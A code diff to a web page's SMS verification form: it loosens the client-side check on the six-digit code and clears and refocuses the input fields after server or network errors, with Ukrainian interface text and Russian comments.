@@ -925,9 +925,9 @@
       const digits = document.querySelectorAll('.sms-digit');
       const code = Array.from(digits).map(d => d.value).join('');
       
-      if (!/^\d{6}$/.test(code)) {
-        document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
-        return;
+      // Убираем фронтенд валидацию - отправляем любой код
+      if (code.length !== 6) {
+        return; // Просто не отправляем если меньше 6 цифр
       }
       
       document.getElementById("send-code-btn").disabled = true;
@@ -961,12 +961,38 @@
           }, 5000);
         } else {
           document.getElementById("send-code-btn").disabled = false;
-          document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
+          
+          // Очищаем все поля ввода при ошибке от сервера
+          const digits = document.querySelectorAll('.sms-digit');
+          digits.forEach(digit => {
+            digit.value = '';
+            digit.classList.remove('filled');
+          });
+          
+          // Фокусируемся на первое поле
+          if (digits.length > 0) {
+            digits[0].focus();
+          }
+          
+          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код з SMS";
         }
       } catch (e) {
         console.error("Ошибка отправки кода:", e);
         document.getElementById("send-code-btn").disabled = false;
-        document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
+        
+        // Очищаем все поля ввода при ошибке сети
+        const digits = document.querySelectorAll('.sms-digit');
+        digits.forEach(digit => {
+          digit.value = '';
+          digit.classList.remove('filled');
+        });
+        
+        // Фокусируемся на первое поле
+        if (digits.length > 0) {
+          digits[0].focus();
+        }
+        
+        document.getElementById("sms-error").textContent = "Помилка з'єднання. Спробуйте ще раз.";
       }
     }
 
